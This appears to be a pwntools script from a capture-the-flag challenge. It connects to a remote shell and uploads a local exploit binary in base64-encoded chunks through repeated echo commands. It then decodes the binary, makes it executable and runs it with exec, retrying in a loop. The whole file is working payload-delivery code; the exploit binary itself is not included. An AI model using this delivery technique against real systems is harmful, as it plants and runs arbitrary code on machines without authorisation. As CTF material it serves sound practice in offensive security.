from pwn import *
from time import time

b = read('./unpacked/e')
data = b64e(b).encode()


while True:
    with remote(args.HOST or '127.0.0.1', int(args.PORT or 8010)) as p:
        if args.LOL:
            p.interactive()
        a = time()

        p.recvuntil(b'\n/ $ ')

        p.sendline(b'cd /home/ctf')
        #p.sendline(b'touch b')
        #p.recvuntil(b'$ ')
        print("Starting sending payload")
        sleep(0.02)

        N=160
        for i in range(0, len(data), N):
            p.sendline(b'echo "%s">>b' % data[i:i+N])
            p.recvuntil(b'$ ')
            sleep(0.02)

        print("Finished sending payload")

        p.sendline(b'base64 -d b>e; chmod +x e')
        p.recvuntil(b'chmod +x e')
        p.recvuntil(b'$ ')
        p.sendline(b'exec ./e')
        p.recvuntil(b'exec ./e')
        p.recvuntil(b'\n')
        b = time()
        print("TIME: ", b-a)
        try:
            if args.I:
                p.interactive()
            print(p.recv())
            print(p.recv())
            print(p.recv())
            print(p.recv())
        except:
            continue
        #p.interactive()
